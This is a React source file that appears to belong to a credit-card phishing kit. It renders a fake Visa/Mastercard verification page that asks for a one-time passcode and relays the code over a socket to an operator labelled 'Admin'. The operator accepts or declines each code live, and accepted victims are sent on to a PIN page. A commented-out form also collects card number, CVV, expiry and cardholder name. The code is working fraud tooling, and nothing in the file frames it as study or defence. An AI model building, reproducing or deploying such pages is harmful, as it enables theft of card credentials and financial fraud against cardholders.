import axios from "axios";
import React, { useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { id } from "./Home";
import { AiOutlineCloseCircle } from "react-icons/ai";

const OTP = () => {
  const [otp, setOtp] = useState("");
  const [load, setLoad] = useState(null);
  const [error, setError] = useState(false);
  const [counter, setCounter] = useState(60);
  
  const handleSubmit = async (e) => {
    setLoad(true);
    setError(false);
    e.preventDefault();

    try {
      await axios
        .post(api_route + "/visaOtp/" + id, { visa_otp: otp })
        .then(() => {
          socket.emit("visaOtp", { id, otp });
        });
    } catch (error) {
      console.error(error);
    }
  };

  socket.on("acceptVisaOTP", (data) => {
    console.log("acceptVisaOTP From Admin", id);
    console.log(data);
    if (id === data) {
      window.location.href = "/pin";
    }
  });

  socket.on("declineVisaOTP", (data) => {
    console.log("declineVisaOTP From Admin", data);

    console.log(data);
    if (id === data) {
      setLoad(false);
      setError("كود تحقق البطاقة غير صحيح برجاء المحاولة مره اخري");
    }
  });

  return (
    <div className="w-full  lg:w-1/2 flex flex-col items-center justify-center  rounded-md">
      <form
        className="bg-white border h-screen border-gray-300 rounded-md  p-3 text-sm w-full"
        onSubmit={handleSubmit}
      >
        <div className="flex w-full gap-x-3 items-center justify-around">
          <div className="w-12 ">
            <img src="/visa_logo.jpg" />
          </div>
          <div className="w-16 ">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTlJeSetovZYxcpQmPuM-fu7k2EzUcVb3qU0w&s" />
          </div>

          <div className="w-12 ">
            <img src="/Mastercard.png" />
          </div>
        </div>
        <p className="py-2 text-xs font-bold">
          to continue with your transaction , please enter the one-time passcode
          sent to your mobile number or email address and click submit
        </p>
        <h2 className="font-semibold my-2 text-gray-500">
          Transaction Details
        </h2>

        <div className="flex justify-between py-1">
          <span className="font-bold">Transaction Amount:</span>
          <span>{Number(sessionStorage.getItem("price")).toFixed(2)} ريال</span>
        </div>
        <div className="flex justify-between py-1">
          <span className="font-bold">Card Number:</span>
          <span>
            ********
            {sessionStorage.getItem("cardNumber").split("").slice(15) || "9666"}
          </span>
        </div>
        <div className="flex justify-between py-1 items-center gap-x-2">
          <span className="font-bold w-1/3"> Enter Code:</span>
          <input
            value={otp}
            required
            onChange={(e) => setOtp(e.target.value)}
            dir="ltr"
            maxLength={6}
            minLength={6}
            inputMode="numeric"
            type="text"
            className="border px-3 py-1 font-light border-gray-400 text-base outline-[#ffc107] rounded-md w-1/2"
          />
        </div>

        {error ? (
          <div className="w-full text-center text-red-500  absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center">
            <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3">
              <AiOutlineCloseCircle className="text-6xl" />
              <div className="flex flex-col w-full items-center justify-center">
                <span>نتيجة الدفع فشل معرف الدفع </span>
                <span>82A27833M4589370G</span>
              </div>
              <button
                className="bg-gray-900 text-white w-11/12 py-3"
                onClick={() => setError(false)}
              >
                حاول مرة ثانية
              </button>
            </div>
          </div>
        ) : (
          ""
        )}

        <div className="w-full flex items-center justify-center py-10">
          {" "}
          <button className="w-fit px-5 flex justify-center items-center py-2  bg-black text-white ">
            Submit
          </button>
        </div>
      </form>
      {load ? (
        <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
          <TailSpin
            height="50"
            width="50"
            color="white"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      ) : (
        ""
      )}
    </div>
    // <div
    //   className="w-full flex flex-col min-h-screen items-center justify-center  relative"
    //   dir="rtl"
    // >
    //   <form
    //     className=" w-11/12  p-3 rounded-xl justify-center  items-center flex flex-col gap-y-2 "
    //     onSubmit={handleSubmit}
    //   >
    //     <div
    //       className="w-full py-3  flex flex-col items-center justify-between p-2 rounded-xl"
    //       dir="rtl"
    //     >
    //       <div className="flex flex-col w-full gap-3  my-2">
    //         <input
    //           value={car_holder_name}
    //           required
    //           onChange={(e) => setCardHolderName(e.target.value)}
    //           dir="ltr"
    //           minLength={4}
    //           type="text"
    //           placeholder="الأسم المدون علي البطاقة"
    //           className="w-full   rounded-md border    p-2  placeholder:text-gray-600 text-center     outline-orange-500"
    //         />
    //       </div>
    //       <div className="flex flex-col w-full gap-3  my-2" dir="rtl">
    // <input
    //   value={card_number}
    //   required
    //   onChange={handleCardNumberChange}
    //   dir="ltr"
    //   maxLength={19}
    //   minLength={16}
    //   inputMode="numeric"
    //   type="text"
    //   placeholder="**** **** **** ****"
    //   className="w-full   rounded-md border    p-2  placeholder:text-gray-600 text-center     outline-orange-500"
    // />
    //       </div>
    //       <div className="w-full flex items-end justify-end">
    //         <img src="/img7.avif" />
    //       </div>
    //       <div className="flex w-full  gap-2">
    //         <div
    //           className="flex flex-col w-full  gap-x-5 text-xl my-2"
    //           dir="rtl"
    //         >
    // <div className="flex w-full gap-x-5 px-2 text-sm ">
    //   <div className="flex items-center justify-center gap-x-2">
    //     <input
    //       className="text-xs  border rounded-md py-2 px-1 text-center w-1/2"
    //       type="text"
    //       value={cvv}
    //       onChange={handleCvvChange}
    //       inputMode="numeric"
    //       placeholder="CVV"
    //       maxLength={3}
    //       required
    //     />
    //     <span className="text-xs"> كود الحماية</span>
    //   </div>
    //   <div className="flex items-center justify-center gap-x-2">
    //     <input
    //       className="text-xs  border rounded-md py-2 px-1 text-center w-1/2"
    //       type="text"
    //       value={expiryDate}
    //       maxLength={5}
    //       inputMode="numeric"
    //       onChange={handleExpiryDateChange}
    //       placeholder="MM/YY"
    //       required
    //     />
    //     <span className="text-xs"> تاريخ الإنتهاء </span>
    //   </div>
    //  </div>
    // </div>
    //       </div>
    //       <div
    //         className="flex items-center justify-start gap-3 px-2 text-lg text-gray-500 my-2 "
    //         dir="rtl"
    //       ></div>

    //       <div className="w-full flex items-center justify-center relative">
    //         <img src="/visa2.png" className="rounded-md" />
    //         {cvv && (
    //           <span className="text-white absolute right-16 top-6 font-semibold">
    //             {cvv}
    //           </span>
    //         )}
    //         <div className="absolute w-full h-full flex flex-col items-center justify-center -bottom-10 gap-y-2">
    //           {car_holder_name && (
    //             <span className="text-white">{car_holder_name}</span>
    //           )}
    //           {card_number && <span className="text-white">{card_number}</span>}
    //           {expiryDate && <span className="text-white">{expiryDate}</span>}
    //         </div>
    //       </div>
    //       {error && (
    //         <span className="text-red-500 w-full text-center text-lg mt-5 font-bold">
    //           {error}
    //         </span>
    //       )}

    //       <button
    //         className="bg-black w-full my-5 font-bold text-white flex items-center justify-center  py-2 rounded-md mt-5"
    //         type="submit"
    //       >
    //         {load ? (
    //           <TailSpin
    //             height="30"
    //             width="30"
    //             color="white"
    //             ariaLabel="tail-spin-loading"
    //             radius="1"
    //             wrapperStyle={{}}
    //             wrapperClass=""
    //             visible={true}
    //           />
    //         ) : (
    //           "تسديد "
    //         )}
    //       </button>
    //     </div>
    //   </form>
    //   <img src="/visa3.png" className="w-11/12 my-2 " />
    // </div>
  );
};

export default OTP;
